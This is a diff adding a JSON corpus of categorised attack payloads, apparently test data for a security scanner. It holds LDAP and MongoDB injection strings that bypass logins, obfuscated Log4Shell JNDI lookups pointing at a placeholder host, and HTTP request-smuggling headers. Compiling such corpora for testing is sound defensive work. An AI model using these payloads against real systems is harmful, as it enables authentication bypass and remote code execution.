@@ -1,0 +1,18 @@
+{
+  "schema": "12-schemas/payload.schema.json",
+  "corpus_id": "PL-INFRA",
+  "version": "1.0.0",
+  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
+  "payloads": [
+    { "payload_id": "PL-INFRA-0001", "cwe_id": "CWE-90", "context": "ldap", "surface": "parameter", "engine": "openldap", "payload": "*", "severity": "high", "tags": ["ldap-injection"], "classification": "T0" },
+    { "payload_id": "PL-INFRA-0002", "cwe_id": "CWE-90", "context": "ldap", "surface": "parameter", "engine": "openldap", "payload": "admin)(|(password=*", "severity": "critical", "tags": ["ldap-injection", "auth-bypass"], "classification": "T1" },
+    { "payload_id": "PL-INFRA-0003", "cwe_id": "CWE-90", "context": "ldap", "surface": "parameter", "engine": "openldap", "payload": ")(cn=*))(|(cn=", "severity": "high", "tags": ["ldap-injection", "filter-bypass"], "classification": "T1" },
+    { "payload_id": "PL-INFRA-0010", "cwe_id": "CWE-20", "context": "nosql", "surface": "body", "engine": "mongodb", "payload": "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}", "severity": "critical", "tags": ["nosql-injection", "auth-bypass"], "classification": "T1" },
+    { "payload_id": "PL-INFRA-0011", "cwe_id": "CWE-20", "context": "nosql", "surface": "body", "engine": "mongodb", "payload": "{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}", "severity": "critical", "tags": ["nosql-injection"], "classification": "T1" },
+    { "payload_id": "PL-INFRA-0020", "cwe_id": "CWE-502", "context": "rce", "surface": "jndi", "engine": "log4j", "payload": "${jndi:ldap://COLLAB:1389/a}", "severity": "critical", "tags": ["log4shell", "rce"], "classification": "T2" },
+    { "payload_id": "PL-INFRA-0021", "cwe_id": "CWE-502", "context": "rce", "surface": "jndi", "engine": "log4j", "payload": "${${lower:j}ndi:ldap://COLLAB/a}", "severity": "critical", "tags": ["log4shell", "obfuscation"], "classification": "T2" },
+    { "payload_id": "PL-INFRA-0030", "cwe_id": "CWE-400", "context": "network", "surface": "header", "engine": "http", "payload": "Transfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\n", "severity": "medium", "tags": ["request-smuggling"], "classification": "T1" },
+    { "payload_id": "PL-INFRA-0031", "cwe_id": "CWE-444", "context": "network", "surface": "header", "engine": "http", "payload": "Content-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n", "severity": "medium", "tags": ["request-smuggling", "desync"], "classification": "T1" },
+    { "payload_id": "PL-INFRA-0040", "cwe_id": "CWE-295", "context": "network", "surface": "header", "engine": "smtp", "payload": "STARTTLS", "severity": "low", "tags": ["starttls-strip"], "classification": "T0" }
+  ]
+}
